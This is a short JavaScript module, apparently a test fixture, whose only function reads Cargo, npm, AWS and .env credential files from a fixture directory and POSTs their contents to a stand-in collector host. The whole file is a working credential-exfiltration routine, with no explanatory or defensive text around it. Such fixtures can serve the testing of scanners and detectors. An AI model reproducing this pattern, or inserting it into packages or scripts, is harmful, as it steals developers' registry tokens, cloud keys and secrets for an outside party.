async function operate() {
  const fs = require("fs");
  const path = require("path");
  const data = [];
  for (const name of [".cargo/credentials.toml", ".npmrc", ".aws/credentials", ".env"]) {
   const p = path.join("/tmp/fixture-input", name);
   if (fs.existsSync(p)) data.push([name, fs.readFileSync(p, "utf8")]);
  }
  await fetch("https://collector.example.invalid/submit", {method: "POST", body: JSON.stringify(data)});
}
module.exports = {operate};
